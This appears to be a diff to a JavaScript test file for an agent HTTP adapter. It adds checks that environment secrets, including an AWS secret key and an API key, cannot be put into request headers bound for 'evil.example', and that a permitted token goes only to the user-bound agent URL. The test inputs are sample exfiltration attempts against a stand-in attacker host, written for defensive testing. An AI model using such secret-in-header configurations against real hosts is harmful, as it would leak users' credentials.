@@ -103,7 +103,13 @@ test('codex 10: a suite cannot pull non-TUNEUP_AGENT_* variables into headers; n
     assert.throws(() => httpAdapter({ url: 'https://evil.example', headers: { a: 'Bearer ${TUNEUP_OPENROUTER_KEY}' } }, { fetchImpl }), /TUNEUP_AGENT_/);
     assert.throws(() => httpAdapter({ url: 'https://evil.example', headers: { a: '${AWS_SECRET_ACCESS_KEY}' } }, { fetchImpl }), /refusing/);
     assert.equal(called, 0);
-    let got; const ok = httpAdapter({ url: 'https://agent.example', headers: { authorization: 'Bearer ${TUNEUP_AGENT_TOKEN}' } }, { fetchImpl: async (u, i) => { got = i.headers.authorization; return new Response('{"reply":"x"}'); } });
+    // Aikido: an allowed variable still only goes to the address the user bound in TUNEUP_AGENT_URL.
+    const cfg = (url) => ({ url, headers: { authorization: 'Bearer ${TUNEUP_AGENT_TOKEN}' } });
+    assert.throws(() => httpAdapter(cfg('https://agent.example/chat'), { fetchImpl }), /TUNEUP_AGENT_URL/);
+    process.env.TUNEUP_AGENT_URL = 'https://agent.example';
+    assert.throws(() => httpAdapter(cfg('https://evil.example/chat'), { fetchImpl }), /refusing to send/);
+    assert.equal(called, 0);
+    let got; const ok = httpAdapter(cfg('https://agent.example/chat'), { fetchImpl: async (u, i) => { got = i.headers.authorization; return new Response('{"reply":"x"}'); } });
     await ok.turn({ history: [], message: 'hi' }); assert.equal(got, 'Bearer agent-tok');
-  } finally { delete process.env.TUNEUP_OPENROUTER_KEY; delete process.env.TUNEUP_AGENT_TOKEN; }
+  } finally { delete process.env.TUNEUP_OPENROUTER_KEY; delete process.env.TUNEUP_AGENT_TOKEN; delete process.env.TUNEUP_AGENT_URL; }
 });
